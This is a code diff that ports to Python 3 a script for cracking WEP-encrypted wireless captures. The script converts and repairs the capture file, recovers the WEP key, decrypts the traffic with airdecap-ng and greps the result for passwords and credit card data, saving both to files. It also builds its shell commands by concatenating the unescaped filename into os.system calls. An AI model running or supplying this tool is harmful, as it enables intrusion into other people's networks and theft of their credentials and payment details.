@@ -1,7 +1,7 @@
 #!/usr/bin/python
 # coding:UTF-8
 
-# This is a script that has been borrowed,
+# This is a script that has been borrowed, and translated to python3
 
 # -------------------------------------------------------------------------------------
 #      PYTHON UTILITY FILE TO CRACK ENCRYPTED .PCAP FILES CAPTURED BY WIRESHARK
@@ -28,34 +28,34 @@ import sys
 # -------------------------------------------------------------------------------------
 
 os.system("clear")
-print " ____   ____    _    ____     ____ ____      _    ____ _  _______ ____   "
-print "|  _ \ / ___|  / \  |  _ \   / ___|  _ \    / \  / ___| |/ / ____|  _ \  "
-print "| |_) | |     / _ \ | |_) | | |   | |_) |  / _ \| |   | ' /|  _| | |_) | "
-print "|  __/| |___ / ___ \|  __/  | |___|  _ <  / ___ \ |___| . \| |___|  _ <  "
-print "|_|    \____/_/   \_\_|      \____|_| \_\/_/   \_\____|_|\_\_____|_| \_\ "
-print "                                                                         "
-print "         BY TERENCE BROADBENT BSC CYBER SECURITY (FIRST CLASS)         \n"
-
+print(r"""
+ " ____   ____    _    ____     ____ ____      _    ____ _  _______ ____   "
+ "|  _ \ / ___|  / \  |  _ \   / ___|  _ \    / \  / ___| |/ / ____|  _ \  "
+ "| |_) | |     / _ \ | |_) | | |   | |_) |  / _ \| |   | ' /|  _| | |_) | "
+ "|  __/| |___ / ___ \|  __/  | |___|  _ <  / ___ \ |___| . \| |___|  _ <  "
+ "|_|    \____/_/   \_\_|      \____|_| \_\/_/   \_\____|_|\_\_____|_| \_\ "
+ "                                                                         "
+""")
 # -------------------------------------------------------------------------------------
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub                                                               
 # Version : 1.0                                                                
-# Details : Conduct routine and simple tests on supplied arguements.   
+# Details : Conduct routine and simple tests on supplied arguments.
 # Modified: N/A                                                               
 # -------------------------------------------------------------------------------------
 
 if os.geteuid() != 0:
-    print "\nPlease run this python script as root..."
+    print("\nPlease run this python script as root...")
     exit(True)
 
 if len(sys.argv) < 2:
-    print "\nUse the command python pcap-cracker.py wiresharkfile.pcapng\n"
+    print("\nUse the command python pcap-cracker.py wiresharkfile.pcapng\n")
     exit(True)
 
 filename = sys.argv[1]
 
 if os.path.exists(filename) == 0:
-    print "\nFile " + filename + " was not found, did you spell it correctly?"
+    print("\nFile " + filename + " was not found, did you spell it correctly?")
     exit(True)
 
 # -------------------------------------------------------------------------------------
@@ -66,19 +66,19 @@ if os.path.exists(filename) == 0:
 # Modified: N/A                                                               
 # -------------------------------------------------------------------------------------
 
-checklist = [ "airmon-ng", "tshark", "editcap" ,"pcapfix"]
+checklist = ["airmon-ng", "tshark", "editcap", "pcapfix"]
 installed = True
 
 for check in checklist:
     cmd = "locate -i " + check + " > /dev/null"
     checked = os.system(cmd)
     if checked != 0:
-        print "I could not find " + check + "..."
+        print("I could not find " + check + "...")
         installed = False
 
-if installed == False:
-   print "\nInstall missing dependencies before you begin...\n"
-   exit (True)
+if not installed:
+    print("\nInstall missing dependencies before you begin...\n")
+    exit(True)
 
 # -------------------------------------------------------------------------------------
 # AUTHOR  : Terence Broadbent                                                    
@@ -91,14 +91,14 @@ if installed == False:
 newfiletype = filename[:-2]
 typetest = filename[-6:]
 
-print "Filename          : " + filename
-print "File Format       : " + typetest
+print("Filename          : " + filename)
+print("File Format       : " + typetest)
 
 if typetest == "pcapng":
-    print "Crack Status      : Converting file format..."
+    print("Crack Status      : Converting file format...")
     os.system("editcap -F pcap '" + filename + "' '" + newfiletype + "' > /dev/null")
     filename = filename[:-2]
-    print "New Filename      : " + filename
+    print("New Filename      : " + filename)
 
 # -------------------------------------------------------------------------------------
 # AUTHOR  : Terence Broadbent                                                    
@@ -110,11 +110,11 @@ if typetest == "pcapng":
 
 os.system("pcapfix -d '" + filename + "' -o Fixerror.pcap > /dev/null")
 
-if os.path.isfile('./Fixerror.pcap') !=0:
-   os.rename(filename, "Oldpcapfile.pcap")
-   os.rename("Fixerror.pcap", filename)
-   print "Crack Status      : Fixing file errors.." + filename
-   print "Orginal Renamed   : Oldpcapfile.pcap" 
+if os.path.isfile('./Fixerror.pcap') != 0:
+    os.rename(filename, "Oldpcapfile.pcap")
+    os.rename("Fixerror.pcap", filename)
+    print("Crack Status      : Fixing file errors.." + filename)
+    print("Original Renamed   : Oldpcapfile.pcap")
 
 # -------------------------------------------------------------------------------------
 # AUTHOR  : Terence Broadbent                                                    
@@ -134,10 +134,10 @@ os.remove('./SSID.txt')
 ssid = "00:" + ssid
 
 if ssid == "00:":
-    print "Empty SSID        : Error..."
-    exit (True)
+    print("Empty SSID        : Error...")
+    exit(True)
 else:
-    print "Service Set Id.   : " + ssid
+    print("Service Set Id.   : " + ssid)
 
 # -------------------------------------------------------------------------------------
 # AUTHOR  : Terence Broadbent                                                    
@@ -152,7 +152,7 @@ os.system("awk '/KEY FOUND!/{print $(NF-1)}' Answer.txt > WepKey.txt")
 os.remove('./Answer.txt')
 wep = open("WepKey.txt").readline().rstrip()
 os.remove("./WepKey.txt")
-print "Wired Privacy Key : " + wep
+print("Wired Privacy Key : " + wep)
 
 # -------------------------------------------------------------------------------------
 # AUTHOR  : Terence Broadbent                                                    
@@ -162,12 +162,12 @@ print "Wired Privacy Key : " + wep
 # Modified: N/A                                                               
 # -------------------------------------------------------------------------------------
 
-os.system("airdecap-ng -w " + wep + " '"+ filename + "' " + "> /dev/null")
+os.system("airdecap-ng -w " + wep + " '" + filename + "' " + "> /dev/null")
 filename2 = filename[:-5]
-filename2 = filename2 + "-dec.pcap"
+filename2 += "-dec.pcap"
 os.rename(filename2, "Cracked.pcap")
-print "Cracked File      : Cracked.pcap"
-print "Crack Status      : Extracting Data...\n"
+print("Cracked File      : Cracked.pcap")
+print("Crack Status      : Extracting Data...\n")
 
 # -------------------------------------------------------------------------------------
 # AUTHOR  : Terence Broadbent                                                    
@@ -184,4 +184,4 @@ os.system("ngrep -q -I Cracked.pcap | grep -i password > Password.txt")
 os.system("ngrep -q -I Cracked.pcap | grep -i credit > Creditcard.txt")
 os.system("ls -p")
 
-#Eof
+# Eof
